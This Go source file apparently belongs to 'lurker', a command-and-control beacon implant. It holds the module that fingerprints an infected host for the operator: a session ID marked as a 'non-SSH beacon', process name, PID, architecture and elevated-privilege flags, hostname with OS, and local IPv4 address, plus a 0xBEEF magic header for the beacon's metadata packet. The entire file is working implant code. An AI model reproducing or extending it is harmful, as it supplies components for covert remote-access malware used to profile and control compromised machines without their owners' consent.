package os

import (
	"encoding/binary"
	"net"
	"os"
	"runtime"
	"strings"

	"lurker/lurker/cryptography"
)

func SessionID() int {
	randomInt := cryptography.RandomInt(100000, 999999)
	return randomInt & ^1 // clear LSB to mark as non-SSH beacon
}

func GetProcessName() string {
	processName := os.Args[0]
	slashPos := strings.LastIndex(processName, "\\")
	if slashPos >= 0 {
		processName = processName[slashPos+1:]
	} else if backslashPos := strings.LastIndex(processName, "/"); backslashPos >= 0 {
		processName = processName[backslashPos+1:]
	}
	if processName == "" {
		return "?"
	}
	return processName
}

func GetPID() int {
	return os.Getpid()
}

func GetMetaDataFlag() int {
	flag := 0
	if IsProcessX64() {
		flag |= 2
	}
	if IsOSX64() {
		flag |= 4
	}
	if IsHighPriv() {
		flag |= 8
	}
	return flag
}

func GetComputerName() string {
	sHostName, err := os.Hostname()
	if err != nil || sHostName == "" {
		sHostName = "?"
	}
	switch runtime.GOOS {
	case "linux":
		sHostName += " (Linux)"
	case "darwin":
		sHostName += " (Darwin)"
	case "freebsd":
		sHostName += " (FreeBSD)"
	case "solaris":
		sHostName += " (Solaris)"
	case "windows":
		sHostName += " (Windows)"
	}
	return sHostName
}

func GetLocalIPInt() uint32 {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return 0
	}
	for _, address := range addrs {
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				if len(ipnet.IP) == 16 {
					return binary.LittleEndian.Uint32(ipnet.IP[12:16])
				}
				return binary.LittleEndian.Uint32(ipnet.IP)
			}
		}
	}
	return 0
}

func GetMagicHead() []byte {
	MagicNum := 0xBEEF
	MagicNumBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(MagicNumBytes, uint32(MagicNum))
	return MagicNumBytes
}
